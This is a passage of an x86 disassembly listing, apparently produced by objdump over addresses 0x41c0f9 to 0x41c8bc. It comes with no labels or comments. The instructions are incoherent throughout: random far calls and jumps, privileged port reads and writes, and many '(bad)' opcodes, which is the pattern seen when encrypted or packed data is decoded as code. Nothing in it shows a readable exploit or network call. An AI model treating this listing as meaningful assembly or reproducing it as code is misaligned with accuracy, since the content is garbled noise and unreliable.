  41c0f9:	sbb    al,0xbc
  41c0fb:	add    eax,0x12af5b4b
  41c100:	stc    
  41c101:	daa    
  41c102:	or     BYTE PTR [ebx],ch
  41c104:	cmp    esi,DWORD PTR [ebx]
  41c106:	mov    DWORD PTR [ebx+0x7a8b7df4],esi
  41c10c:	lea    ecx,[edi]
  41c10e:	popf   
  41c10f:	cmc    
  41c110:	call   0x103ad9ce
  41c115:	xor    al,0xd5
  41c117:	loopne 0x41c12b
  41c119:	je     0x41c155
  41c11b:	sub    al,0x62
  41c11d:	and    BYTE PTR [ecx-0xa],ah
  41c120:	mov    al,ds:0x6872bd07
  41c125:	xor    eax,0x6422bb0
  41c12a:	pop    eax
  41c12b:	inc    ecx
  41c12c:	xchg   cl,bh
  41c12e:	mov    ecx,esp
  41c130:	mov    ebx,0xeee35b2d
  41c135:	in     eax,dx
  41c136:	js     0x41c158
  41c138:	repz ds mov esp,0xb3b7efde
  41c13f:	fmul   QWORD PTR [edx+0x2f4516a5]
  41c145:	jae    0x41c1ac
  41c147:	jbe    0x41c142
  41c149:	jae    0x41c12d
  41c14b:	sub    al,0x79
  41c14d:	xchg   edi,eax
  41c14e:	in     eax,dx
  41c14f:	jbe    0x41c102
  41c151:	call   0x983:0x553080d2
  41c158:	push   es
  41c159:	fmul   DWORD PTR [eax+edx*1+0x1a]
  41c15d:	in     ax,0x57
  41c160:	adc    ah,BYTE PTR [ecx-0x574a4d8]
  41c166:	test   DWORD PTR [esi+0x6b],eax
  41c169:	adc    BYTE PTR [ecx],dl
  41c16b:	outs   dx,BYTE PTR ds:[esi]
  41c16c:	jmp    0xf4d0f6b3
  41c171:	pushf  
  41c172:	aad    0x20
  41c174:	repnz call 0x2baf:0x2cb48c9
  41c17c:	ss dec eax
  41c17e:	es push esp
  41c180:	ror    BYTE PTR [ebx+0x1a],0x57
  41c184:	mov    dh,0xeb
  41c186:	mov    cl,bh
  41c188:	cmp    eax,0xb963656e
  41c18d:	fisttp QWORD PTR [edi]
  41c18f:	in     al,dx
  41c190:	xchg   edx,eax
  41c191:	add    eax,0x216475df
  41c196:	jl     0x41c20c
  41c198:	fwait
  41c199:	xchg   ebp,eax
  41c19a:	and    al,0x10
  41c19c:	loopne 0x41c212
  41c19e:	xchg   edx,eax
  41c19f:	scas   al,BYTE PTR es:[edi]
  41c1a0:	mov    eax,ds:0x9b08fb0f
  41c1a5:	or     bh,bh
  41c1a7:	pop    ebx
  41c1a8:	imul   edi,DWORD PTR [edi],0xf5fad891
  41c1ae:	dec    ebx
  41c1af:	or     eax,0x83f3b10
  41c1b4:	jo     0x41c222
  41c1b6:	jge    0x41c146
  41c1b8:	xor    eax,0x2bb3d61b
  41c1bd:	push   0x4d33d1c5
  41c1c2:	pop    edi
  41c1c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c4:	push   esp
  41c1c5:	repz mov edi,0xe8a2dc25
  41c1cb:	push   edi
  41c1cc:	in     eax,dx
  41c1cd:	ins    BYTE PTR es:[edi],dx
  41c1ce:	jno    0x41c18a
  41c1d0:	push   ebp
  41c1d1:	jle    0x41c233
  41c1d3:	rol    DWORD PTR [edi-0x18ef3022],1
  41c1d9:	inc    esp
  41c1da:	push   esi
  41c1db:	fist   DWORD PTR [eax-0x3d]
  41c1de:	dec    esp
  41c1df:	(bad)  
  41c1e0:	fmul   QWORD PTR ds:0x42f8dbc5
  41c1e6:	dec    esp
  41c1e7:	test   DWORD PTR [ecx-0x729c5bc],0xdbae3109
  41c1f1:	cmc    
  41c1f2:	jle    0x41c1ed
  41c1f4:	cmp    ebp,DWORD PTR [edi+0x17]
  41c1f7:	and    eax,0xd5e73101
  41c1fc:	call   0x20f3af84
  41c201:	data16 (bad) 
  41c203:	cwde   
  41c204:	sbb    eax,0x1e98ee7e
  41c209:	sbb    eax,0x825b891f
  41c20e:	or     eax,DWORD PTR [esi]
  41c210:	out    dx,eax
  41c211:	into   
  41c212:	add    DWORD PTR [esp+ebp*1-0x363c4851],edi
  41c219:	xor    al,0xd0
  41c21b:	push   esi
  41c21c:	or     BYTE PTR [edi+0x72],al
  41c21f:	push   ecx
  41c220:	and    BYTE PTR ds:0xddad00d1,al
  41c226:	push   edx
  41c227:	ins    BYTE PTR es:[edi],dx
  41c228:	mov    ch,0x2a
  41c22a:	sbb    ebp,DWORD PTR [esi]
  41c22c:	cmovae ebp,DWORD PTR [ebx+0x41]
  41c230:	sub    eax,ecx
  41c232:	or     cl,BYTE PTR [ebp+esi*4+0x6a634503]
  41c239:	(bad)  [ebx-0x68aa125a]
  41c23f:	aaa    
  41c240:	pop    es
  41c241:	js     0x41c1e2
  41c243:	shl    DWORD PTR [edx+ecx*2-0x1b],1
  41c247:	daa    
  41c248:	fadd   QWORD PTR [esi]
  41c24a:	(bad)  
  41c24b:	jnp    0x41c1e0
  41c24d:	add    al,0xf6
  41c24f:	das    
  41c250:	pop    eax
  41c251:	mov    ebx,0xd668840c
  41c256:	int3   
  41c257:	ds rcl cl,1
  41c25a:	inc    esi
  41c25b:	mov    eax,0x846709f7
  41c260:	push   esp
  41c261:	pop    es
  41c262:	dec    esp
  41c263:	das    
  41c264:	sub    al,0x40
  41c266:	xchg   esi,eax
  41c267:	xor    edi,DWORD PTR [edx]
  41c269:	hlt    
  41c26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c26b:	addr16 add eax,0xd6e8b9f6
  41c271:	jg     0x41c208
  41c273:	aas    
  41c274:	sti    
  41c275:	mov    bl,0xbc
  41c277:	mov    eax,ds:0x3e533315
  41c27c:	add    eax,0x50a08358
  41c281:	loop   0x41c2a0
  41c283:	jmp    0x41c2b1
  41c285:	fistp  QWORD PTR [esi-0x3db5452e]
  41c28b:	xlat   BYTE PTR ds:[ebx]
  41c28c:	pop    eax
  41c28d:	xor    BYTE PTR [bx+di-0x26],dl
  41c291:	pop    eax
  41c292:	mov    edx,0x2548da69
  41c297:	xchg   edx,eax
  41c298:	sub    eax,0x6675040a
  41c29d:	push   eax
  41c29e:	dec    esi
  41c29f:	and    eax,0xa3029a8b
  41c2a4:	ror    esp,0x6e
  41c2a7:	sti    
  41c2a8:	lods   eax,DWORD PTR ds:[esi]
  41c2a9:	or     al,0x9f
  41c2ab:	sbb    eax,0x5cdedaaf
  41c2b0:	xchg   ebp,eax
  41c2b1:	jmp    0x5be2:0xf4fb4da1
  41c2b8:	lahf   
  41c2b9:	adc    eax,ebx
  41c2bb:	inc    ecx
  41c2bc:	add    ecx,DWORD PTR [eax]
  41c2be:	ror    DWORD PTR [ebx-0x69452e83],cl
  41c2c4:	and    al,0xef
  41c2c6:	stos   DWORD PTR es:[edi],eax
  41c2c7:	lahf   
  41c2c8:	and    ebp,0xffffffc7
  41c2cb:	faddp  st(1),st
  41c2cd:	outs   dx,BYTE PTR ds:[esi]
  41c2ce:	stos   BYTE PTR es:[edi],al
  41c2cf:	cmp    BYTE PTR [esi+0x16],0x17
  41c2d3:	pop    eax
  41c2d4:	test   al,0xef
  41c2d6:	int    0x58
  41c2d8:	idiv   BYTE PTR [edi-0x61]
  41c2db:	jnp    0x41c2ab
  41c2dd:	stc    
  41c2de:	fld    QWORD PTR [edx]
  41c2e0:	je     0x41c2bd
  41c2e2:	sub    eax,0xd01f97ff
  41c2e7:	dec    esp
  41c2e8:	jnp    0x41c277
  41c2ea:	dec    esi
  41c2eb:	mov    WORD PTR [ebx+0x3bf26040],?
  41c2f1:	mov    dh,0xde
  41c2f3:	or     dl,cl
  41c2f5:	(bad)  
  41c2f6:	ss ss or esi,esp
  41c2fa:	mov    ch,0xfa
  41c2fc:	hlt    
  41c2fd:	sbb    dl,BYTE PTR [ebp+0x6f]
  41c300:	pop    ebp
  41c301:	jo     0x41c30c
  41c303:	imul   ebp,DWORD PTR [ecx],0xab8c1e3d
  41c309:	adc    cl,BYTE PTR [ecx+0x2be1af36]
  41c30f:	je     0x41c2e0
  41c311:	sbb    eax,0x7cf8ff2c
  41c316:	xor    ebp,esi
  41c318:	sahf   
  41c319:	or     BYTE PTR [edi+0x69],bh
  41c31c:	xchg   edx,eax
  41c31d:	repnz mov cl,BYTE PTR [ebx+0x35]
  41c321:	mov    ebx,ebx
  41c323:	push   ds
  41c324:	mov    ah,0xd3
  41c326:	push   ds
  41c327:	fild   QWORD PTR [edx+0x6f]
  41c32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c32b:	sub    al,0xe2
  41c32d:	pop    esp
  41c32e:	mov    ebx,0x2267b181
  41c333:	mov    eax,ds:0x47d63af1
  41c338:	ds dec esp
  41c33a:	ja     0x41c3a7
  41c33c:	test   BYTE PTR [ebx+eax*4-0x35f21ff0],dh
  41c343:	pop    ss
  41c344:	push   esi
  41c345:	sahf   
  41c346:	enter  0xa6cc,0xb
  41c34a:	jbe    0x41c2cd
  41c34c:	xorps  xmm6,XMMWORD PTR [esi]
  41c34f:	xor    DWORD PTR [edi-0x3c],0x3d66d8e9
  41c356:	or     eax,edi
  41c358:	cmp    edx,edi
  41c35a:	cmp    eax,0xcf9639d6
  41c35f:	loop   0x41c37f
  41c361:	popf   
  41c362:	dec    esp
  41c363:	sub    dh,BYTE PTR ds:0x5030c76b
  41c369:	es push 0x37f6e54b
  41c36f:	mov    dh,0x38
  41c371:	inc    ebx
  41c372:	dec    ebx
  41c373:	arpl   WORD PTR ds:0x9b3cbeb7,bp
  41c379:	inc    esi
  41c37a:	pop    esi
  41c37b:	dec    esp
  41c37c:	popf   
  41c37d:	pop    ecx
  41c37e:	fst    st(7)
  41c380:	sbb    ah,bh
  41c382:	xor    bl,dl
  41c384:	pop    eax
  41c385:	out    0x2c,eax
  41c387:	cmp    bl,BYTE PTR [ecx+edx*8-0x73]
  41c38b:	add    eax,0xaf8ed05a
  41c390:	sub    al,0xad
  41c392:	mov    dl,0x4f
  41c394:	adc    ebx,DWORD PTR [eax+0x67]
  41c397:	dec    eax
  41c398:	test   edx,edi
  41c39a:	fild   WORD PTR [ebx-0x6cfd8d4]
  41c3a0:	add    BYTE PTR [ebx-0x67265d85],dl
  41c3a6:	xor    al,0xd0
  41c3a8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c3aa:	inc    edi
  41c3ab:	cld    
  41c3ac:	push   cs
  41c3ad:	and    edi,edx
  41c3af:	outs   dx,BYTE PTR ds:[esi]
  41c3b0:	jp     0x41c396
  41c3b2:	jbe    0x41c3cc
  41c3b4:	mov    ch,0xf
  41c3b6:	bound  edi,QWORD PTR [esi+0x16d695d7]
  41c3bc:	push   es
  41c3bd:	sub    DWORD PTR [ecx],eax
  41c3bf:	mov    BYTE PTR [esi+0x4d973738],ah
  41c3c5:	fld    DWORD PTR [edx+0x41]
  41c3c8:	lock (bad) 
  41c3cb:	mov    ds:0xd4f726f0,al
  41c3d0:	xlat   BYTE PTR ds:[ebx]
  41c3d1:	push   0x8d428b64
  41c3d6:	push   esp
  41c3d7:	push   0xffffffa1
  41c3d9:	xor    al,0x75
  41c3db:	jae    0x41c3a4
  41c3dd:	(bad)  
  41c3de:	lock fistp WORD PTR ss:[eax-0x75]
  41c3e3:	or     al,0x8c
  41c3e5:	pop    edx
  41c3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3e7:	inc    esp
  41c3e8:	adc    DWORD PTR [ecx],esp
  41c3ea:	(bad)  
  41c3ec:	xchg   esp,eax
  41c3ed:	sub    dh,BYTE PTR [edi-0x1f00fbf7]
  41c3f3:	xchg   esi,eax
  41c3f4:	popa   
  41c3f5:	mov    ecx,DWORD PTR [ecx-0x3d2f86ce]
  41c3fb:	inc    esp
  41c3fc:	pushf  
  41c3fd:	(bad)  
  41c3fe:	mov    BYTE PTR [eax-0x37911ce8],cl
  41c404:	jmp    0x6b00:0x92ca7a15
  41c40b:	and    cl,dl
  41c40d:	jge    0x41c3be
  41c40f:	pusha  
  41c410:	mov    gs,ebp
  41c412:	or     BYTE PTR [edx],dh
  41c414:	sbb    esi,DWORD PTR ds:0x23db29e5
  41c41a:	imul   ebp,DWORD PTR [esi-0x7ddbd22],0xc2d7d2a1
  41c424:	(bad)  
  41c425:	cmp    dh,dl
  41c427:	fucom  st(6)
  41c429:	and    cl,bh
  41c42b:	jecxz  0x41c3df
  41c42d:	retf   0xb99d
  41c430:	jmp    0xe82d7bb9
  41c435:	clc    
  41c436:	mov    ch,0x95
  41c438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c439:	scas   al,BYTE PTR es:[edi]
  41c43a:	adc    ebx,esp
  41c43c:	addr16 cmp eax,0x5fbe803c
  41c442:	dec    edi
  41c443:	dec    ebp
  41c444:	inc    DWORD PTR [esi-0x3b]
  41c447:	dec    esi
  41c448:	sub    bl,cl
  41c44a:	jns    0x41c4c4
  41c44c:	push   0x6db25bf
  41c451:	add    ebp,DWORD PTR [edx+0x1ec906aa]
  41c457:	mov    ebp,0x13934796
  41c45c:	fisubr DWORD PTR [ecx+0x3]
  41c45f:	daa    
  41c460:	mov    ah,0xba
  41c462:	inc    esi
  41c463:	lds    ecx,FWORD PTR [edi-0x6f]
  41c466:	lgs    ebx,FWORD PTR [ecx+0xf3353de]
  41c46d:	ret    0x511b
  41c470:	push   0xa272f2b8
  41c475:	and    al,0xf7
  41c477:	push   ebx
  41c478:	xor    al,0xed
  41c47a:	jo     0x41c473
  41c47c:	lds    edx,FWORD PTR [ecx-0x118ad11d]
  41c482:	mov    WORD PTR [edx+esi*1+0x77],fs
  41c486:	or     edx,DWORD PTR [esp+edi*2]
  41c489:	sub    esp,0x159610c9
  41c48f:	arpl   WORD PTR [ecx-0x70],bx
  41c492:	or     DWORD PTR [ebx+0x761a30fd],ecx
  41c498:	imul   DWORD PTR [ebx+edx*8+0x4]
  41c49c:	mov    ebp,0x8c7f098e
  41c4a1:	cwde   
  41c4a2:	pop    eax
  41c4a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4a4:	sbb    ah,BYTE PTR [eax+0x5]
  41c4a7:	(bad)  
  41c4a8:	leave  
  41c4a9:	xchg   ebx,eax
  41c4aa:	into   
  41c4ab:	call   0xc618:0xd0393a6f
  41c4b2:	in     al,0xc9
  41c4b4:	dec    ebp
  41c4b5:	xor    al,0xff
  41c4b7:	mov    esi,DWORD PTR [ecx+0x13]
  41c4ba:	mov    ebx,0xae39f3e
  41c4bf:	bound  esp,QWORD PTR [edx-0x30d0d9b9]
  41c4c5:	lock mov BYTE PTR [ecx],ah
  41c4c8:	xchg   esp,eax
  41c4c9:	lds    edx,FWORD PTR [edx+esi*4-0x6c]
  41c4cd:	retf   
  41c4ce:	ins    BYTE PTR es:[edi],dx
  41c4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4d0:	leave  
  41c4d1:	stos   DWORD PTR es:[edi],eax
  41c4d2:	jae    0x41c527
  41c4d4:	fs mov bh,0x38
  41c4d7:	js     0x41c555
  41c4d9:	sbb    eax,0x43b74f35
  41c4de:	les    edx,FWORD PTR [ecx+0x72]
  41c4e1:	or     BYTE PTR [edx-0x705987c0],0x59
  41c4e8:	sbb    eax,0x2e0c662b
  41c4ed:	mov    ch,0xb4
  41c4ef:	jmp    0x41c53a
  41c4f1:	lea    ebp,[ebp+0x13fdc29f]
  41c4f7:	jmp    0xda79:0xac6b9a66
  41c4fe:	add    DWORD PTR [ebx+0x48907cee],ebp
  41c504:	rcr    DWORD PTR [edi-0x3afe30aa],0xc
  41c50b:	rcl    DWORD PTR ds:0x18da7fdc,0xa5
  41c512:	cmp    al,BYTE PTR [ecx+0x3bae70d1]
  41c518:	add    eax,0xeac4bfdf
  41c51d:	addr16 mov ebx,0x256f82ec
  41c523:	cmp    eax,0xcfd5b49f
  41c528:	fdiv   DWORD PTR [edi+0x71]
  41c52b:	inc    esp
  41c52c:	popf   
  41c52d:	iret   
  41c52e:	cwde   
  41c52f:	adc    dh,dh
  41c531:	dec    ebp
  41c532:	(bad)  
  41c533:	jge    0x41c4f0
  41c535:	xlat   BYTE PTR ds:[ebx]
  41c536:	in     al,0x13
  41c538:	data16 rol BYTE PTR [edi+0x33b228c2],1
  41c53f:	fidiv  DWORD PTR ds:0xd47e1ddf
  41c545:	adc    bl,bh
  41c547:	and    eax,ebp
  41c549:	sbb    edx,DWORD PTR [esi]
  41c54b:	hlt    
  41c54c:	xchg   ebp,eax
  41c54d:	inc    esi
  41c54e:	jg     0x41c5b1
  41c550:	pop    edx
  41c551:	sbb    DWORD PTR ds:0x9224cf0b,ecx
  41c557:	mov    ebp,0xb0de96ba
  41c55c:	push   ss
  41c55d:	mov    ebp,DWORD PTR [ebx-0x4b1787d1]
  41c563:	mov    ebp,DWORD PTR [eax+ecx*2-0x2a1bab98]
  41c56a:	cmc    
  41c56b:	in     eax,dx
  41c56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c56d:	cmp    eax,0xfefc6ef9
  41c572:	cmp    DWORD PTR [esi+0x74],edx
  41c575:	inc    edx
  41c576:	pop    esp
  41c577:	sub    cl,BYTE PTR [eax-0x7b]
  41c57a:	sub    DWORD PTR [ecx],0xffffff92
  41c57d:	xchg   ebp,eax
  41c57e:	mov    esi,0xe6eeca4f
  41c583:	mov    esi,0x26687e38
  41c588:	ja     0x41c550
  41c58a:	push   DWORD PTR [edx+0x5e]
  41c58d:	sbb    eax,0x8f347997
  41c592:	fs cdq 
  41c594:	xor    al,0x66
  41c596:	push   ebp
  41c597:	jnp    0x41c542
  41c599:	pushf  
  41c59a:	and    ecx,esp
  41c59c:	arpl   sp,sp
  41c59e:	sub    BYTE PTR [esi+0x4dca6c23],cl
  41c5a4:	nop
  41c5a5:	sbb    eax,DWORD PTR [edx+0x7f]
  41c5a8:	pop    ebp
  41c5a9:	dec    ebp
  41c5aa:	pop    ebp
  41c5ab:	inc    eax
  41c5ac:	loope  0x41c5b4
  41c5ae:	push   esp
  41c5af:	stos   BYTE PTR es:[edi],al
  41c5b0:	in     eax,dx
  41c5b1:	push   ss
  41c5b2:	mov    cl,0x27
  41c5b4:	pusha  
  41c5b5:	sbb    al,0x4d
  41c5b7:	and    al,0x5f
  41c5b9:	out    0x6e,al
  41c5bb:	fs dec ebx
  41c5bd:	dec    esp
  41c5be:	xchg   BYTE PTR [esi-0x42],al
  41c5c1:	scas   eax,DWORD PTR es:[edi]
  41c5c2:	cli    
  41c5c3:	enter  0x94e9,0xc9
  41c5c7:	icebp  
  41c5c8:	and    BYTE PTR [eax],al
  41c5ca:	adc    al,BYTE PTR [esi+0x73947510]
  41c5d0:	div    DWORD PTR [eax]
  41c5d2:	rcr    BYTE PTR [eax+0x9],1
  41c5d5:	sbb    DWORD PTR [ebx+eiz*1+0x3ce89d9a],0xffffffa5
  41c5dd:	jne    0x41c5f7
  41c5df:	fs gs fucomp st(6)
  41c5e3:	sbb    dl,BYTE PTR [ebx-0x52561495]
  41c5e9:	ret    0x9335
  41c5ec:	mov    DWORD PTR [edi-0x42],esp
  41c5ef:	repz or cl,BYTE PTR [di-0x64]
  41c5f4:	das    
  41c5f5:	(bad)  
  41c5f6:	outs   dx,BYTE PTR ds:[esi]
  41c5f7:	jne    0x41c60f
  41c5f9:	mov    esi,0xbfe9fe05
  41c5fe:	fiadd  DWORD PTR [eax-0x5d1f362d]
  41c604:	out    dx,eax
  41c605:	pop    ds
  41c606:	mov    bl,0x52
  41c608:	es mov al,0x1f
  41c60b:	jno    0x41c60e
  41c60d:	inc    ebx
  41c60e:	popf   
  41c60f:	jl     0x41c5de
  41c611:	sti    
  41c612:	jg     0x41c673
  41c614:	in     eax,0xf8
  41c616:	xchg   ch,dl
  41c618:	push   0xfffffff0
  41c61a:	add    eax,esp
  41c61c:	add    al,0x6a
  41c61e:	xchg   ebx,eax
  41c61f:	mov    bl,0x19
  41c621:	test   BYTE PTR [eax],dh
  41c623:	sbb    ch,al
  41c625:	sar    DWORD PTR [ebp-0x50],cl
  41c628:	or     al,0x68
  41c62a:	sbb    eax,0x2b9b9d70
  41c62f:	test   al,0x3f
  41c631:	iret   
  41c632:	js     0x41c5e1
  41c634:	int    0xed
  41c636:	mov    al,bh
  41c638:	push   ebx
  41c639:	pop    ss
  41c63a:	dec    edx
  41c63b:	xchg   edx,eax
  41c63c:	dec    ecx
  41c63d:	test   al,0x3d
  41c63f:	fisttp WORD PTR [ecx]
  41c641:	cli    
  41c642:	cmc    
  41c643:	mov    ds:0x8c7b2c15,al
  41c648:	add    al,0xe2
  41c64a:	mov    ds:0x63128d7f,eax
  41c64f:	jnp    0x41c638
  41c651:	adc    BYTE PTR [esi-0x65],0xa6
  41c655:	jecxz  0x41c66b
  41c657:	bound  edi,QWORD PTR [edi]
  41c659:	addr16 in eax,0xc9
  41c65c:	scas   eax,DWORD PTR es:[edi]
  41c65d:	shl    DWORD PTR [edx+esi*4],cl
  41c660:	jge    0x41c647
  41c662:	push   ecx
  41c663:	lods   al,BYTE PTR ds:[esi]
  41c664:	sub    BYTE PTR [edi+eiz*2+0x1a],cl
  41c668:	pop    ecx
  41c669:	in     eax,0x88
  41c66b:	ds dec esp
  41c66d:	push   ss
  41c66e:	cmp    eax,0x3dffbff1
  41c673:	xchg   edx,eax
  41c674:	push   esp
  41c675:	sbb    esp,ecx
  41c677:	repnz out 0x53,al
  41c67a:	gs inc ebp
  41c67c:	xchg   BYTE PTR [esi+0x60850810],dl
  41c682:	mov    bh,0xd3
  41c684:	sbb    ch,al
  41c686:	mov    gs,WORD PTR [eax]
  41c688:	fisub  DWORD PTR [edx]
  41c68a:	xor    DWORD PTR [edx+0x55155444],ebx
  41c690:	pop    edi
  41c691:	std    
  41c692:	div    DWORD PTR es:[ebx-0x306781a1]
  41c699:	shl    ch,0x56
  41c69c:	mov    DWORD PTR [eax],esi
  41c69e:	fld    st(1)
  41c6a0:	add    eax,0xfc7fa62a
  41c6a5:	(bad)  
  41c6a6:	out    dx,al
  41c6a7:	push   es
  41c6a8:	rcr    al,1
  41c6aa:	stos   DWORD PTR es:[edi],eax
  41c6ab:	pusha  
  41c6ac:	repnz add al,0xff
  41c6af:	sub    al,0x9e
  41c6b1:	outs   dx,DWORD PTR ds:[esi]
  41c6b2:	sbb    eax,0x83666857
  41c6b7:	call   0x910fe56f
  41c6bc:	or     al,0xbd
  41c6be:	sti    
  41c6bf:	imul   edi,DWORD PTR [esi*4-0x72ce40c3],0x66
  41c6c7:	jecxz  0x41c688
  41c6c9:	test   eax,0xba239592
  41c6ce:	mov    al,cs:0x95ef8896
  41c6d4:	(bad)  
  41c6d5:	mov    ecx,0xceb7a255
  41c6da:	mov    esi,0x3fa4904b
  41c6df:	stos   BYTE PTR es:[edi],al
  41c6e0:	mov    ebp,0xe7342994
  41c6e5:	dec    esi
  41c6e6:	and    al,0xf
  41c6e8:	sub    DWORD PTR [eax],esp
  41c6ea:	mov    ebp,0x6ca48362
  41c6ef:	sub    ecx,ebx
  41c6f1:	popf   
  41c6f2:	pop    ecx
  41c6f3:	cmp    bl,BYTE PTR [edx]
  41c6f5:	add    bl,dh
  41c6f7:	jmp    0x52f656e2
  41c6fc:	shl    DWORD PTR [ecx+0x2a8889e5],cl
  41c702:	(bad)  
  41c703:	fidiv  DWORD PTR [esi-0x5aa5ae95]
  41c709:	mov    edi,0x6142a9ca
  41c70e:	mov    eax,0x555144dc
  41c713:	adc    dl,cl
  41c715:	fdivr  st,st(0)
  41c717:	clc    
  41c718:	not    BYTE PTR [ecx]
  41c71a:	push   ecx
  41c71b:	aas    
  41c71c:	pop    eax
  41c71d:	fwait
  41c71e:	dec    ecx
  41c71f:	into   
  41c720:	addr16 push ecx
  41c722:	mov    cs,WORD PTR [esi]
  41c724:	xchg   edi,eax
  41c725:	xor    BYTE PTR [ebp-0x6807aeb1],bh
  41c72b:	mov    al,0x27
  41c72d:	xchg   edx,eax
  41c72e:	adc    ebp,DWORD PTR [eax+0x4dddc7bf]
  41c734:	xor    ecx,DWORD PTR [ebx+0x55]
  41c737:	jae    0x41c6ef
  41c739:	xchg   edi,eax
  41c73a:	push   cs
  41c73b:	sub    DWORD PTR [esi-0x18],eax
  41c73e:	cmp    edi,DWORD PTR [edi+0x147a2b17]
  41c744:	xchg   edi,eax
  41c745:	ja     0x41c7b9
  41c747:	aad    0x10
  41c749:	xor    al,0x24
  41c74b:	retf   0x3a40
  41c74e:	mov    esp,0x5bf0b4a2
  41c753:	call   0x9996:0x36e00063
  41c75a:	cmp    al,0x76
  41c75c:	out    0xa1,eax
  41c75e:	pusha  
  41c75f:	xchg   BYTE PTR [ebx+0x5a],dl
  41c762:	mov    ebp,0x1fbb9558
  41c767:	pop    es
  41c768:	push   esi
  41c769:	mov    dh,0x6c
  41c76b:	scas   eax,DWORD PTR es:[edi]
  41c76c:	lea    edx,[eax+0x70ccbc76]
  41c772:	rcr    BYTE PTR [ebx],0xeb
  41c775:	mov    dl,0x6e
  41c777:	adc    al,0x63
  41c779:	(bad)
  41c77c:	mov    WORD PTR [eax],ss
  41c77e:	rcl    BYTE PTR [ecx-0x2137b1de],cl
  41c784:	mov    ebx,0xcb8bb1b8
  41c789:	out    dx,al
  41c78a:	xor    DWORD PTR [ebx],eax
  41c78c:	sub    DWORD PTR [edx+0x4c],edx
  41c78f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c790:	repnz int3 
  41c792:	jmp    0xe961:0x7d4c59c
  41c799:	shl    BYTE PTR ds:0xf21cfb69,0x3b
  41c7a0:	mul    DWORD PTR ds:0xfd0e955
  41c7a6:	fidivr WORD PTR [esi+0x6982999e]
  41c7ac:	aam    0x59
  41c7ae:	and    esp,ecx
  41c7b0:	jl     0x41c80c
  41c7b2:	mov    bl,0x76
  41c7b4:	xchg   cl,al
  41c7b6:	cdq    
  41c7b7:	push   ds
  41c7b8:	mov    al,ds:0xaee2f041
  41c7bd:	add    ebp,DWORD PTR [edi]
  41c7bf:	ja     0x41c7b2
  41c7c1:	sbb    DWORD PTR [eax+0x5628d11b],ebx
  41c7c7:	and    bl,BYTE PTR [edx]
  41c7c9:	mov    ch,0x3
  41c7cb:	xchg   bl,cl
  41c7cd:	dec    eax
  41c7ce:	or     eax,0xce11ee76
  41c7d3:	pushf  
  41c7d4:	cmp    bh,BYTE PTR [eax+ebx*4]
  41c7d7:	jns    0x41c7c1
  41c7d9:	or     BYTE PTR [ecx-0x4ab1fd68],al
  41c7df:	push   ss
  41c7e0:	mov    ss,WORD PTR [edx]
  41c7e2:	mov    ah,0xff
  41c7e4:	xchg   ebp,eax
  41c7e5:	fwait
  41c7e6:	pop    es
  41c7e7:	push   edx
  41c7e8:	psrld  mm5,QWORD PTR [edx+0x1cc83597]
  41c7ef:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41c7f1:	in     al,0x8
  41c7f3:	xlat   BYTE PTR ds:[ebx]
  41c7f4:	and    dl,BYTE PTR [ebx+0x5443186]
  41c7fa:	shl    bl,0xaf
  41c7fd:	push   edi
  41c7fe:	inc    edx
  41c7ff:	adc    eax,0xd9b1b694
  41c804:	scas   al,BYTE PTR es:[edi]
  41c805:	repnz enter 0xcbbb,0x15
  41c80a:	sti    
  41c80b:	jecxz  0x41c7a6
  41c80d:	neg    al
  41c80f:	enter  0xefb2,0x7
  41c813:	mov    esi,DWORD PTR [edi+ebp*4-0x87a9913]
  41c81a:	icebp  
  41c81b:	sbb    BYTE PTR [eax+esi*2+0x72f6da46],cl
  41c822:	xchg   edx,eax
  41c823:	sahf   
  41c824:	or     DWORD PTR [esi+0x2b5d828d],esi
  41c82a:	inc    ecx
  41c82b:	mov    bl,0x1b
  41c82d:	jo     0x41c892
  41c82f:	or     BYTE PTR [ecx+0x45676b82],0x67
  41c836:	scas   al,BYTE PTR es:[edi]
  41c837:	fcomip st,st(4)
  41c839:	cmp    eax,0xff80b5c
  41c83e:	xor    BYTE PTR [ebp-0x11],bh
  41c841:	es sub eax,0x2ff9c72f
  41c847:	inc    eax
  41c848:	lds    edx,FWORD PTR [eax]
  41c84a:	scas   al,BYTE PTR es:[edi]
  41c84b:	jmp    0x41c8b0
  41c84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c84e:	cmp    DWORD PTR [ebp+0x41e30068],0x53
  41c855:	xchg   edx,eax
  41c856:	dec    eax
  41c857:	ss mov dl,0x9f
  41c85a:	adc    eax,0x4af0460d
  41c85f:	inc    edx
  41c860:	in     al,dx
  41c861:	and    DWORD PTR [eax],edx
  41c863:	dec    edx
  41c864:	bound  ecx,QWORD PTR [eax-0xff5d605]
  41c86a:	or     al,0x9e
  41c86c:	sbb    DWORD PTR [eax],ebp
  41c86e:	repz mov edx,0xb79b0fbd
  41c874:	inc    esi
  41c875:	dec    edi
  41c876:	mov    bl,0x74
  41c878:	pop    eax
  41c879:	dec    ebp
  41c87a:	bound  esp,QWORD PTR [ecx+0x26]
  41c87d:	cwde   
  41c87e:	jbe    0x41c817
  41c880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c881:	lea    edi,[ebp+0x1016babc]
  41c887:	sbb    ebx,DWORD PTR [esi+0x4ba16457]
  41c88d:	adc    eax,0x52dc3593
  41c892:	mov    edx,0x7808f155
  41c897:	ja     0x41c901
  41c899:	jmp    0x270:0x39bb698e
  41c8a0:	add    ah,BYTE PTR [esi+0x3885a30e]
  41c8a6:	sbb    esp,0xc58e52a
  41c8ac:	and    ebx,0x40
  41c8af:	inc    ebx
  41c8b0:	into   
  41c8b1:	out    dx,eax
  41c8b2:	mov    DWORD PTR [ebx],esi
  41c8b4:	xchg   BYTE PTR [ecx],bh
  41c8b6:	cmp    bh,BYTE PTR [eax-0x2fa4b92a]
  41c8bc:	out    0x39,eax
